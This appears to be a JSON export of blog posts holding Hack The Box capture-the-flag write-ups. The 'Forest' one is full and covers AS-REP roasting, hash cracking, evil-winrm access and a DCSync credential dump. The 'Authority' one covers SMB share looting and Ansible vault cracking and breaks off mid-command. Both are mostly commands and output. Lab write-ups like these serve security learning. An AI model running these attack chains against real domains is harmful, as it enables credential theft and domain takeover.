[ { "title": "Hack The Box - Forest", "url": "/posts/Hack-The-Box-Forest/", "categories": "hackthebox", "tags": "windows, Active Directory, smbmap, smbclient, Bloodhound, Dcsync, Easy", "date": "2025-07-05 00:00:00 -0400", "snippet": "Forest is an easy Windows machine. It is a domain controller that allows us to enumerate users over RPC, attack Kerberos with AS-REP Roasting for a service account, and gain an initial foothold.The...", "content": "Forest is an easy Windows machine. It is a domain controller that allows us to enumerate users over RPC, attack Kerberos with AS-REP Roasting for a service account, and gain an initial foothold.The service account is found to be a member of the Account Operators group, which can be used to add users to the Exchange Windows Permissions group and then perform a DCSync attack to dump the NTLM hash and obtain the Administrator shell.ReconNmapStarting with nmap. nmap found a bunch of open ports.sudo nmap -p- 10.10.10.161 --min-rate 10000 -oN forest.nmapStarting Nmap 7.94SVN ( https://nmap.org ) at 2025-07-05 21:53 CDTNmap scan report for 10.10.10.161Host is up (0.11s latency).Not shown: 65511 closed tcp ports (reset)PORT STATE SERVICE53/tcp open domain88/tcp open kerberos-sec135/tcp open msrpc139/tcp open netbios-ssn389/tcp open ldap445/tcp open microsoft-ds464/tcp open kpasswd5593/tcp open http-rpc-epmap636/tcp open ldapssl3268/tcp open globalcatLDAP3269/tcp open globalcatLDAPssl5985/tcp open wsman9389/tcp open adws47001/tcp open winrm49664/tcp open unknown49665/tcp open unknown49666/tcp open unknown49667/tcp open unknown49671/tcp open unknown49676/tcp open unknown49677/tcp open unknown49684/tcp open unknown49706/tcp open unknown49956/tcp open unknownNmap done: 1 IP address (1 host up) scanned in 13.01 seconds$sudo nmap -sC -sV -p 53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,47001,49664,49665,49666,49667,49671,49676,49677,49684,49706,49956 10.10.10.161 -oN forest-service.nmapStarting Nmap 7.94SVN ( https://nmap.org ) at 2025-07-05 21:54 CDTNmap scan report for 10.10.10.161Host is up (0.12s latency).PORT STATE SERVICE VERSION53/tcp open domain Simple DNS Plus88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2025-07-06 00:44:10Z)135/tcp open msrpc Microsoft Windows RPC139/tcp open netbios-ssn Microsoft Windows netbios-ssn389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)445/tcp open microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds (workgroup: HTB)464/tcp open kpasswd5?593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0636/tcp open tcpwrapped3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)3269/tcp open tcpwrapped5985/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)|_http-title: Not Found|_http-server-header: Microsoft-HTTPAPI/2.09389/tcp open mc-nmf .NET Message Framing47001/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)|_http-server-header: Microsoft-HTTPAPI/2.0|_http-title: Not Found49664/tcp open msrpc Microsoft Windows RPC49665/tcp open msrpc Microsoft Windows RPC49666/tcp open msrpc Microsoft Windows RPC49667/tcp open msrpc Microsoft Windows RPC49671/tcp open msrpc Microsoft Windows RPC49676/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.049677/tcp open msrpc Microsoft Windows RPC49684/tcp open msrpc Microsoft Windows RPC49706/tcp open msrpc Microsoft Windows RPC49956/tcp open msrpc Microsoft Windows RPCService Info: Host: FOREST; OS: Windows; CPE: cpe:/o:microsoft:windowsHost script results:| smb2-time: | date: 2025-07-06T00:45:02|_ start_date: 2025-07-06T00:32:00| smb2-security-mode: | 3:1:1: |_ Message signing enabled and required|_clock-skew: mean: 9m05s, deviation: 4h02m31s, median: -2h10m56s| smb-os-discovery: | OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)| Computer name: FOREST| NetBIOS computer name: FOREST\\x00| Domain name: htb.local| Forest name: htb.local| FQDN: FOREST.htb.local|_ System time: 2025-07-05T17:45:04-07:00| smb-security-mode: | account_used: &lt;blank&gt;| authentication_level: user| challenge_response: supported|_ message_signing: requiredService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 71.60 secondsOpen ports like LDAP and Kerberoas confirms that this is a Domain Controller for the domain htb.local. nmap also reveals that this is a windows server 2016./etc/hostswe will add the domain name to the hosts file10.10.10.161 forest.htb.local htb.localSMB EnumerationSmbmap didnot allows us to list the shares without a valid credentials.smbmap -H 10.10.10.161 -u '' -p '' [+] IP: 10.10.10.161:445\tName: 10.10.10.161 RPC - TCP 445we can check over RPC to enumerate users. We can use rpcclient for this. we can get a list of usersnames with enumdomusers on rpcclient.rpcclient -U \"\" -N 10.10.10.161rpcclient $&gt; enumdomusersuser:[Administrator] rid:[0x1f4]user:[Guest] rid:[0x1f5]user:[krbtgt] rid:[0x1f6]user:[DefaultAccount] rid:[0x1f7]user:[$331000-VK4ADACQNUCA] rid:[0x463]user:[SM_2c8eef0a09b545acb] rid:[0x464]user:[SM_ca8c2ed5bdab4dc9b] rid:[0x465]user:[SM_75a538d3025e4db9a] rid:[0x466]user:[SM_681f53d4942840e18] rid:[0x467]user:[SM_1b41c9286325456bb] rid:[0x468]user:[SM_9b69f1b9d2cc45549] rid:[0x469]user:[SM_7c96b981967141ebb] rid:[0x46a]user:[SM_c75ee099d0a64c91b] rid:[0x46b]user:[SM_1ffab36a2f5f479cb] rid:[0x46c]user:[HealthMailboxc3d7722] rid:[0x46e]user:[HealthMailboxfc9daad] rid:[0x46f]user:[HealthMailboxc0a90c9] rid:[0x470]user:[HealthMailbox670628e] rid:[0x471]user:[HealthMailbox968e74d] rid:[0x472]user:[HealthMailbox6ded678] rid:[0x473]user:[HealthMailbox83d6781] rid:[0x474]user:[HealthMailboxfd87238] rid:[0x475]user:[HealthMailboxb01ac64] rid:[0x476]user:[HealthMailbox7108a4e] rid:[0x477]user:[HealthMailbox0659cc1] rid:[0x478]user:[sebastien] rid:[0x479]user:[lucinda] rid:[0x47a]user:[svc-alfresco] rid:[0x47b]user:[andy] rid:[0x47e]user:[mark] rid:[0x47f]user:[santi] rid:[0x480]We can also get a list of groups using enudomgroupsrpcclient $&gt; enumdomgroupsgroup:[Enterprise Read-only Domain Controllers] rid:[0x1f2]group:[Domain Admins] rid:[0x200]group:[Domain Users] rid:[0x201]group:[Domain Guests] rid:[0x202]group:[Domain Computers] rid:[0x203]group:[Domain Controllers] rid:[0x204]group:[Schema Admins] rid:[0x206]group:[Enterprise Admins] rid:[0x207]group:[Group Policy Creator Owners] rid:[0x208]group:[Read-only Domain Controllers] rid:[0x209]group:[Cloneable Domain Controllers] rid:[0x20a]group:[Protected Users] rid:[0x20d]group:[Key Admins] rid:[0x20e]group:[Enterprise Key Admins] rid:[0x20f]group:[DnsUpdateProxy] rid:[0x44e]group:[Organization Management] rid:[0x450]group:[Recipient Management] rid:[0x451]group:[View-Only Organization Management] rid:[0x452]group:[Public Folder Management] rid:[0x453]group:[UM Management] rid:[0x454]group:[Help Desk] rid:[0x455]group:[Records Management] rid:[0x456]group:[Discovery Management] rid:[0x457]group:[Server Management] rid:[0x458]group:[Delegated Setup] rid:[0x459]group:[Hygiene Management] rid:[0x45a]group:[Compliance Management] rid:[0x45b]group:[Security Reader] rid:[0x45c]group:[Security Administrator] rid:[0x45d]group:[Exchange Servers] rid:[0x45e]group:[Exchange Trusted Subsystem] rid:[0x45f]group:[Managed Availability Servers] rid:[0x460]group:[Exchange Windows Permissions] rid:[0x461]group:[ExchangeLegacyInterop] rid:[0x462]group:[$D31000-NSEL5BRJ63V7] rid:[0x46d]group:[Service Accounts] rid:[0x47c]group:[Privileged IT Accounts] rid:[0x47d]group:[test] rid:[0x13ed]We can also view the number of group members of a group.rpcclient $&gt; querygroup 0x200\tGroup Name:\tDomain Admins\tDescription:\tDesignated administrators of the domain\tGroup Attribute:7\tNum Members:1rpcclient $&gt; querygroup 0x206\tGroup Name:\tSchema Admins\tDescription:\tDesignated administrators of the schema\tGroup Attribute:7\tNum Members:1rpcclient $&gt; Shell as Svc-alfrescoAsrep roastingwe will add all the usernames in a list.Since we have a list of valid users, now we can check if there is any account that have propery “Do not require Kerberos preauthentication” or “UF_DONT_REQUIRE_PREAUTH” set to true. For this, we will utilize impacket-GetNPUsers and try to get the hash for the user.impacket-GetNPUsers htb.local/ -no-pass -dc-ip 10.10.10.161 -usersfile users.txt Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies [-] User sebastien doesn't have UF_DONT_REQUIRE_PREAUTH set[-] User lucinda doesn't have UF_DONT_REQUIRE_PREAUTH set$krb5asrep$23$svc-alfresco@HTB.LOCAL:0987a16611644081aba095f6b57b3ea7$f8ee77afeba5bff918766b265c8c33d57e34cd8cbcaa7c020ca740160e8f877520909135f56db2d900311733d824892ab862b2d408cd0c323b0984652e9deea2bd8e8bfa8dd871c47f1c82f5bbe91db461b7ec3ea7502bde534ba3f6cf2a739206a9463d79c95d2f94f93654533beb0220c74238899c187f0508b5662f60053b217b845d52fb8775c5805c1a1f4882faa36712c2badff0cb27381692e0be1e9b0a2a16bd93d59134477f3b41f9a7ac4e115a738b1e74732296edc551efce53aecf0b7e42b448f7bda649343e90f20e62390529890099447e2b616edd101787a2e95cdce71072[-] User andy doesn't have UF_DONT_REQUIRE_PREAUTH set[-] User mark doesn't have UF_DONT_REQUIRE_PREAUTH set[-] User santi doesn't have UF_DONT_REQUIRE_PREAUTH set[-] invalid principal syntaxWe got the hash of svc-alfresco. That means this user is vulnerable to asrep-roasting attack.Hashcatwe will add hash of this user in a hash.txt file and use hashcat to crack it.$hashcat hash.txt /usr/share/wordlists/rockyou.txt $krb5asrep$23$svc-alfresco@HTB.LOCAL:0987a16611644081aba095f6b57b3ea7$f8ee77afeba5bff918766b265c8c33d57e34cd8cbcaa7c020ca740160e8f877520909135f56db2d900311733d824892ab862b2d408cd0c323b0984652e9deea2bd8e8bfa8dd871c47f1c82f5bbe91db461b7ec3ea7502bde534ba3f6cf2a739206a9463d79c95d2f94f93654533beb0220c74238899c187f0508b5662f60053b217b845d52fb8775c5805c1a1f4882faa36712c2badff0cb27381692e0be1e9b0a2a16bd93d59134477f3b41f9a7ac4e115a738b1e74732296edc551efce53aecf0b7e42b448f7bda649343e90f20e62390529890099447e2b616edd101787a2e95cdce71072:s3rvice Session..........: hashcatStatus...........: CrackedHash.Mode........: 18200 (Kerberos 5, etype 23, AS-REP)Hash.Target......: $krb5asrep$23$svc-alfresco@HTB.LOCAL:0987a166116440...e71072Time.Started.....: Sat Jul 5 19:59:02 2025 (9 secs)Time.Estimated...: Sat Jul 5 19:59:11 2025 (0 secs)Kernel.Feature...: Pure KernelGuess.Base.......: File (/usr/share/wordlists/rockyou.txt)Guess.Queue......: 1/1 (100.00%)Speed.#1.........: 473.2 kH/s (1.68ms) @ Accel:512 Loops:1 Thr:1 Vec:8Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)Progress.........: 4085760/14344385 (28.48%)Rejected.........: 0/4085760 (0.00%)Restore.Point....: 4084736/14344385 (28.48%)Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1Candidate.Engine.: Device GeneratorCandidates.#1....: s456822 -&gt; s3r3ndipitHardware.Mon.#1..: Util: 91%Started: Sat Jul 5 19:58:33 2025Stopped: Sat Jul 5 19:59:12 2025We can see that the hash has been cracked and the password is s3rvice.we will use netexec with this creds to check if we can winrm and get a shell.$netexec winrm 10.10.10.161 -u svc-alfresco -p s3rviceWINRM 10.10.10.161 5985 FOREST [*] Windows 10 / Server 2016 Build 14393 (name:FOREST) (domain:htb.local)WINRM 10.10.10.161 5985 FOREST [+] htb.local\\svc-alfresco:s3rvice (Pwn3d!)And it works. Now we will use evil-winrm to get the shell.$evil-winrm -i 10.10.10.161 -u svc-alfresco -p s3rvice Evil-WinRM shell v3.5 *Evil-WinRM* PS C:\\Users\\svc-alfresco\\Documents&gt; Shell as AdministratorWith this shell, we can upload SharpHound.exe and collect data to further enumerate.*Evil-WinRM* PS C:\\Users\\svc-alfresco\\Desktop&gt; upload SharpHound.exe*Evil-WinRM* PS C:\\Users\\svc-alfresco\\Desktop&gt; ./SharpHound.exe -c All&lt;SNIP&gt;&gt; 118 name to SID mappings. 0 machine sid mappings. 2 sid to domain mappings. 0 global catalog mappings.2025-07-05T18:16:01.7277200-07:00|INFORMATION|SharpHound Enumeration Completed at 6:16 PM on 7/5/2025! Happy Graphing!We will now download the zip file on our machine, extract the zip contents and the load into the bloodhoud for analysis. Once the data has been loaded into the bloodhound we can check the interesting queries.First, we will search for the svc-alfresco user, and mark it as owned. It’s found that svc-alfresco is a member of six groupsthrough nested membership.One of the nested group is Account Operators which is a privileged AD group. According to the documentation, the Account Operators group members are allowed to create and modify users and add them to non-protected groups.When we check the “Shortest Path to High Value targets”, we can see the following graph.One of the paths shows that the Exchange Windows Permissions group has WriteDacl privileges on the Domain. The WriteDACL privilege allows a user to add ACLs to an object. We can add users to this group and give them DCSync privileges.From the winrm shell, we will add a user tester with password test@123.*Evil-WinRM* PS C:\\Users\\svc-alfresco\\Documents&gt; net user tester test@123 /add /domainThe command completed successfully.*Evil-WinRM* PS C:\\Users\\svc-alfresco\\Documents&gt; net usersUser accounts for \\\\-------------------------------------------------------------------------------$331000-VK4ADACQNUCA Administrator andyDefaultAccount Guest HealthMailbox0659cc1HealthMailbox670628e HealthMailbox6ded678 HealthMailbox7108a4eHealthMailbox83d6781 HealthMailbox968e74d HealthMailboxb01ac64HealthMailboxc0a90c9 HealthMailboxc3d7722 HealthMailboxfc9daadHealthMailboxfd87238 krbtgt lucindamark santi sebastienSM_1b41c9286325456bb SM_1ffab36a2f5f479cb SM_2c8eef0a09b545acbSM_681f53d4942840e18 SM_75a538d3025e4db9a SM_7c96b981967141ebbSM_9b69f1b9d2cc45549 SM_c75ee099d0a64c91b SM_ca8c2ed5bdab4dc9bsvc-alfresco tester The command completed with one or more errors.Then, we will add user tester to the Exchange Windows Permissions group.*Evil-WinRM* PS C:\\Users\\svc-alfresco\\Documents&gt; net group \"Exchange Windows Permissions\" tester /addThe command completed successfully.*Evil-WinRM* PS C:\\Users\\svc-alfresco\\Documents&gt; net user testerUser name testerFull NameCommentUser's commentCountry/region code 000 (System Default)Account active YesAccount expires NeverPassword last set 7/6/2025 8:15:06 AMPassword expires NeverPassword changeable 7/7/2025 8:15:06 AMPassword required YesUser may change password YesWorkstations allowed AllLogon scriptUser profileHome directoryLast logon NeverLogon hours allowed AllLocal Group MembershipsGlobal Group memberships *Exchange Windows Perm*Domain UsersThe command completed successfully.We can see that the tester user is now a member of Exchange Windows Permissions groups.On the graph when we click on writeDACL it shows us how we can abuse it.According to the bloodhound, first we need to authenticate to the Domain Controller as a member of EXCHANGE WINDOWS PERMISSIONS. Since we are not running a process as a member we need to create a PSCredential object and the use Pwerview's Add-ObjectACL to grant tester user Dcsync rights.*Evil-WinRM* PS C:\\Users\\svc-alfresco\\Documents&gt; . .\\PowerView.ps1*Evil-WinRM* PS C:\\Users\\svc-alfresco\\Documents&gt; $SecPassword = ConvertTo-SecureString 'test@123' -AsPlainText -Force*Evil-WinRM* PS C:\\Users\\svc-alfresco\\Documents&gt; $cred = New-Object System.Management.Automation.PSCredential('htb.local\\tester', $SecPassword)*Evil-WinRM* PS C:\\Users\\svc-alfresco\\Documents&gt; Add-ObjectACL -PrincipalIdentity tester -Credential $cred -Rights DCSyncNow we can either use mimikatz or impacket-secretsdump to get the administrator hash.impacket-secretsdump htb.local/tester@10.10.10.161 Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies Password:[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied [*] Dumping Domain Credentials (domain\\uid:rid:lmhash:nthash)[*] Using the DRSUAPI method to get NTDS.DIT secretshtb.local\\Administrator:500:aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6:::Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::&lt;SNIP&gt;Now, we can get administrator shell using the hash with evil-winrm.*Evil-WinRM* PS C:\\Users\\Administrator\\Desktop&gt; dir Directory: C:\\Users\\Administrator\\DesktopMode LastWriteTime Length Name---- ------------- ------ -----ar--- 7/5/2025 5:32 PM 34 root.txt" }, { "title": "Hack The Box - Authority", "url": "/posts/Hack-The-Box-Authority/", "categories": "hackthebox", "tags": "windows, Active Directory, ESC1, smbmap, smbclient, PassTheCert, Ansible, Medium", "date": "2025-07-01 00:00:00 -0400", "snippet": "Authority is a Windows Domain Controller.We accessed open SMB shares and found some Ansible playbooks.From there, we cracked some encrypted fields to extract credentials for a PWM instance.The PWM ...", "content": "Authority is a Windows Domain Controller.We accessed open SMB shares and found some Ansible playbooks.From there, we cracked some encrypted fields to extract credentials for a PWM instance.The PWM instance was running in configuration mode, which allowed us to make it authenticate to our machine over LDAP, exposing plaintext credentials.Using those credentials, we enumerated Active Directory Certificate Services (AD CS) and found it vulnerable to ESC1. Instead of any domain user being allowed to enroll, any domain computer had that permission.So, we added a fake computer to the domain and used it to request a certificate on behalf of the Domain Controller.Although the certificate couldn’t be used for direct logon, we used pass-the-cert attack to dump NTLM hashes and got Administrator access.ReconNmapStarting with nmap. nmap finds a lot of open ports.$nmap 10.10.11.222 -oN authority-allports.nmapStarting Nmap 7.94SVN ( https://nmap.org ) at 2025-07-03 09:34 CDTNmap scan report for 10.10.11.222Host is up (0.050s latency).Not shown: 987 closed tcp ports (reset)PORT STATE SERVICE53/tcp open domain80/tcp open http88/tcp open kerberos-sec135/tcp open msrpc139/tcp open netbios-ssn389/tcp open ldap445/tcp open microsoft-ds464/tcp open kpasswd5593/tcp open http-rpc-epmap636/tcp open ldapssl3268/tcp open globalcatLDAP3269/tcp open globalcatLDAPssl8443/tcp open https-altNmap done: 1 IP address (1 host up) scanned in 617.75 seconds$nmap -sC -sV -p 53,80,88,135,139,389,445,464,593,636,3268,3269,8443 -oN authority-service.nmap 10.10.11.222Nmap scan report for 10.10.11.222Host is up (0.088s latency).PORT STATE SERVICE VERSION53/tcp open domain Simple DNS Plus80/tcp open http Microsoft IIS httpd 10.0|_http-title: IIS Windows Server| http-methods: |_ Potentially risky methods: TRACE|_http-server-header: Microsoft-IIS/10.088/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2025-07-03 18:56:45Z)135/tcp open msrpc Microsoft Windows RPC139/tcp open netbios-ssn Microsoft Windows netbios-ssn389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: authority.htb, Site: Default-First-Site-Name)| ssl-cert: Subject: | Subject Alternative Name: othername: UPN::AUTHORITY$@htb.corp, DNS:authority.htb.corp, DNS:htb.corp, DNS:HTB| Not valid before: 2022-08-09T23:03:21|_Not valid after: 2024-08-09T23:13:21|_ssl-date: 2025-07-03T18:57:36+00:00; +4h00m00s from scanner time.445/tcp open microsoft-ds?464/tcp open kpasswd5?593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0636/tcp open ssl/ldap Microsoft Windows Active Directory LDAP (Domain: authority.htb, Site: Default-First-Site-Name)|_ssl-date: 2025-07-03T18:57:36+00:00; +4h00m01s from scanner time.| ssl-cert: Subject: | Subject Alternative Name: othername: UPN::AUTHORITY$@htb.corp, DNS:authority.htb.corp, DNS:htb.corp, DNS:HTB| Not valid before: 2022-08-09T23:03:21|_Not valid after: 2024-08-09T23:13:213268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: authority.htb, Site: Default-First-Site-Name)| ssl-cert: Subject: | Subject Alternative Name: othername: UPN::AUTHORITY$@htb.corp, DNS:authority.htb.corp, DNS:htb.corp, DNS:HTB| Not valid before: 2022-08-09T23:03:21|_Not valid after: 2024-08-09T23:13:21|_ssl-date: 2025-07-03T18:57:36+00:00; +4h00m00s from scanner time.3269/tcp open ssl/ldap Microsoft Windows Active Directory LDAP (Domain: authority.htb, Site: Default-First-Site-Name)| ssl-cert: Subject: | Subject Alternative Name: othername: UPN::AUTHORITY$@htb.corp, DNS:authority.htb.corp, DNS:htb.corp, DNS:HTB| Not valid before: 2022-08-09T23:03:21|_Not valid after: 2024-08-09T23:13:21|_ssl-date: 2025-07-03T18:57:36+00:00; +4h00m01s from scanner time.8443/tcp open ssl/https-alt|_ssl-date: TLS randomness does not represent time| fingerprint-strings: | FourOhFourRequest: | HTTP/1.1 200 | Content-Type: text/html;charset=ISO-8859-1| Content-Length: 82| Date: Thu, 03 Jul 2025 18:56:54 GMT| Connection: close| &lt;html&gt;&lt;head&gt;&lt;meta http-equiv=\"refresh\" content=\"0;URL='/pwm'\"/&gt;&lt;/head&gt;&lt;/html&gt;| GetRequest: | HTTP/1.1 200 | Content-Type: text/html;charset=ISO-8859-1| Content-Length: 82| Date: Thu, 03 Jul 2025 18:56:53 GMT| Connection: close| &lt;html&gt;&lt;head&gt;&lt;meta http-equiv=\"refresh\" content=\"0;URL='/pwm'\"/&gt;&lt;/head&gt;&lt;/html&gt;| HTTPOptions: | HTTP/1.1 200 | Allow: GET, HEAD, POST, OPTIONS| Content-Length: 0| Date: Thu, 03 Jul 2025 18:56:53 GMT| Connection: close| RTSPRequest: | HTTP/1.1 400 | Content-Type: text/html;charset=utf-8| Content-Language: en| Content-Length: 1936| Date: Thu, 03 Jul 2025 18:57:00 GMT| Connection: close| &lt;!doctype html&gt;&lt;html lang=\"en\"&gt;&lt;head&gt;&lt;title&gt;HTTP Status 400 | Request&lt;/title&gt;&lt;style type=\"text/css\"&gt;body {font-family:Tahoma,Arial,sans-serif;} h1, h2, h3, b {color:white;background-color:#525D76;} h1 {font-size:22px;} h2 {font-size:16px;} h3 {font-size:14px;} p {font-size:12px;} a {color:black;} .line {height:1px;background-color:#525D76;border:none;}&lt;/style&gt;&lt;/head&gt;&lt;body&gt;&lt;h1&gt;HTTP Status 400 |_ Request&lt;/h1&gt;&lt;hr class=\"line\" /&gt;&lt;p&gt;&lt;b&gt;Type&lt;/b&gt; Exception Report&lt;/p&gt;&lt;p&gt;&lt;b&gt;Message&lt;/b&gt; Invalid character found in the HTTP protocol [RTSP&amp;#47;1.00x0d0x0a0x0d0x0a...]&lt;/p&gt;&lt;p&gt;&lt;b&gt;Description&lt;/b&gt; The server cannot or will not process the request due to something that is perceived to be a client error (e.g., malformed request syntax, invalid| ssl-cert: Subject: commonName=172.16.2.118| Not valid before: 2025-07-01T18:05:50|_Not valid after: 2027-07-04T05:44:14|_http-title: Site doesnt have a title (text/html;charset=ISO-8859-1).1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :SF-Port8443-TCP:V=7.94SVN%T=SSL%I=7%D=7/3%Time=68669A34%P=x86_64-pc-linux-SF:gnu%r(GetRequest,DB,\"HTTP/1\\.1\\x20200\\x20\\r\\nContent-Type:\\x20text/htmlSF:;charset=ISO-8859-1\\r\\nContent-Length:\\x2082\\r\\nDate:\\x20Thu,\\x2003\\x20SF:Jul\\x202025\\x2018:56:53\\x20GMT\\r\\nConnection:\\x20close\\r\\n\\r\\n\\n\\n\\n\\n\\SF:n&lt;html&gt;&lt;head&gt;&lt;meta\\x20http-equiv=\\\"refresh\\\"\\x20content=\\\"0;URL='/pwm'\\SF:\"/&gt;&lt;/head&gt;&lt;/html&gt;\")%r(HTTPOptions,7D,\"HTTP/1\\.1\\x20200\\x20\\r\\nAllow:\\x2SF:0GET,\\x20HEAD,\\x20POST,\\x20OPTIONS\\r\\nContent-Length:\\x200\\r\\nDate:\\x20SF:Thu,\\x2003\\x20Jul\\x202025\\x2018:56:53\\x20GMT\\r\\nConnection:\\x20close\\r\\SF:n\\r\\n\")%r(FourOhFourRequest,DB,\"HTTP/1\\.1\\x20200\\x20\\r\\nContent-Type:\\xSF:20text/html;charset=ISO-8859-1\\r\\nContent-Length:\\x2082\\r\\nDate:\\x20ThuSF:,\\x2003\\x20Jul\\x202025\\x2018:56:54\\x20GMT\\r\\nConnection:\\x20close\\r\\n\\rSF:\\n\\n\\n\\n\\n\\n&lt;html&gt;&lt;head&gt;&lt;meta\\x20http-equiv=\\\"refresh\\\"\\x20content=\\\"0;SF:URL='/pwm'\\\"/&gt;&lt;/head&gt;&lt;/html&gt;\")%r(RTSPRequest,82C,\"HTTP/1\\.1\\x20400\\x20\\SF:r\\nContent-Type:\\x20text/html;charset=utf-8\\r\\nContent-Language:\\x20en\\SF:r\\nContent-Length:\\x201936\\r\\nDate:\\x20Thu,\\x2003\\x20Jul\\x202025\\x2018:SF:57:00\\x20GMT\\r\\nConnection:\\x20close\\r\\n\\r\\n&lt;!doctype\\x20html&gt;&lt;html\\x20SF:lang=\\\"en\\\"&gt;&lt;head&gt;&lt;title&gt;HTTP\\x20Status\\x20400\\x20\\xe2\\x80\\x93\\x20Bad\\xSF:20Request&lt;/title&gt;&lt;style\\x20type=\\\"text/css\\\"&gt;body\\x20{font-family:TahomSF:a,Arial,sans-serif;}\\x20h1,\\x20h2,\\x20h3,\\x20b\\x20{color:white;backgrouSF:nd-color:#525D76;}\\x20h1\\x20{font-size:22px;}\\x20h2\\x20{font-size:16px;SF:}\\x20h3\\x20{font-size:14px;}\\x20p\\x20{font-size:12px;}\\x20a\\x20{color:bSF:lack;}\\x20\\.line\\x20{height:1px;background-color:#525D76;border:none;}&lt;SF:/style&gt;&lt;/head&gt;&lt;body&gt;&lt;h1&gt;HTTP\\x20Status\\x20400\\x20\\xe2\\x80\\x93\\x20Bad\\x2SF:0Request&lt;/h1&gt;&lt;hr\\x20class=\\\"line\\\"\\x20/&gt;&lt;p&gt;&lt;b&gt;Type&lt;/b&gt;\\x20Exception\\x20SF:Report&lt;/p&gt;&lt;p&gt;&lt;b&gt;Message&lt;/b&gt;\\x20Invalid\\x20character\\x20found\\x20in\\x20tSF:he\\x20HTTP\\x20protocol\\x20\\[RTSP&amp;#47;1\\.00x0d0x0a0x0d0x0a\\.\\.\\.\\]&lt;/p&gt;&lt;pSF:&gt;&lt;b&gt;Description&lt;/b&gt;\\x20The\\x20server\\x20cannot\\x20or\\x20will\\x20not\\x20SF:process\\x20the\\x20request\\x20due\\x20to\\x20something\\x20that\\x20is\\x20peSF:rceived\\x20to\\x20be\\x20a\\x20client\\x20error\\x20\\(e\\.g\\.,\\x20malformed\\xSF:20request\\x20syntax,\\x20invalid\\x20);Service Info: Host: AUTHORITY; OS: Windows; CPE: cpe:/o:microsoft:windowsHost script results:|_clock-skew: mean: 4h00m00s, deviation: 0s, median: 3h59m59s| smb2-time: | date: 2025-07-03T18:57:30|_ start_date: N/A| smb2-security-mode: | 3:1:1: |_ Message signing enabled and requiredService detection performed. Please report any incorrect results at https://nmap.org/submit/ ./etc/hostsAdding authority.htb to our hosts file.10.10.11.222 authority.htbPort - 80Port 80 returns a default IIS webpage.The 404 page also looks like the default IIS error page.Port 8443Port 8443 redirects to /pwm/.When we click on the arrow we can see more information and the version number of PWM.Clicking on any of the tab Configuration Manager and Configuration Editor, it prompts us for password.SMB EnumerationUsing smbmap we can see that we have access to the Development share.smbmap -H 10.10.11.222 -u 'anonymous' -p ''[+] Guest session \tIP: 10.10.11.222:445\tName: authority.htb Disk \tPermissions\tComment\t---- \t-----------\t-------\tADMIN$ \tNO ACCESS\tRemote Admin\tC$ \tNO ACCESS\tDefault share\tDepartment Shares \tNO ACCESS\t\tDevelopment \tREAD ONLY\t\tIPC$ \tREAD ONLY\tRemote IPC\tNETLOGON \tNO ACCESS\tLogon server share \tSYSVOL \tNO ACCESS\tLogon server share SmbclientNow, we will use smbclinet will null authentication to view and download all the files locally.$smbclient -N //10.10.11.222/Development Try \"help\" to get a list of possible commands.smb: \\&gt; dir . D 0 Fri Mar 17 08:20:38 2023 .. D 0 Fri Mar 17 08:20:38 2023 Automation D 0 Fri Mar 17 08:20:40 2023smb: \\&gt; RECURSE ONsmb: \\&gt; prompt nosmb: \\&gt; mget *getting file \\Automation\\Ansible\\ADCS\\.ansible-lint of size 259 as Automation/Ansible/ADCS/.ansible-lint (0.9 KiloBytes/sec) (average 0.9 KiloBytes/sec)&lt;SNIP&gt;Shell as svc_ldapAsnsible FilesWe have downloaded a folder called Automation which contains Anisble files.Under Ansible &gt; PWM &gt; defaults &gt; main.yml we can see some credentials.pwm_run_dir: \"\"pwm_hostname: authority.htb.corppwm_http_port: \"\"pwm_https_port: \"\"pwm_https_enable: truepwm_require_ssl: falsepwm_admin_login: !vault | $ANSIBLE_VAULT;1.1;AES256 32666534386435366537653136663731633138616264323230383566333966346662313161326239 6134353663663462373265633832356663356239383039640a346431373431666433343434366139 35653634376333666234613466396534343030656165396464323564373334616262613439343033 6334326263326364380a653034313733326639323433626130343834663538326439636232306531 3438pwm_admin_password: !vault | $ANSIBLE_VAULT;1.1;AES256 31356338343963323063373435363261323563393235633365356134616261666433393263373736 3335616263326464633832376261306131303337653964350a363663623132353136346631396662 38656432323830393339336231373637303535613636646561653637386634613862316638353530 3930356637306461350a316466663037303037653761323565343338653934646533663365363035 6531ldap_uri: ldap://127.0.0.1/ldap_base_dn: \"DC=authority,DC=htb\"ldap_admin_password: !vault | $ANSIBLE_VAULT;1.1;AES256 63303831303534303266356462373731393561313363313038376166336536666232626461653630 3437333035366235613437373733316635313530326639330a643034623530623439616136363563 34646237336164356438383034623462323531316333623135383134656263663266653938333334 3238343230333633350a646664396565633037333431626163306531336336326665316430613566 3764Credentials RecoveryThe values in the file are protected by Ansible vault. We can use ansible2john which takes a file with two lines one header and other the hex-encoded value. First we need to format the protected values in the files.$cat ldap_admin_password 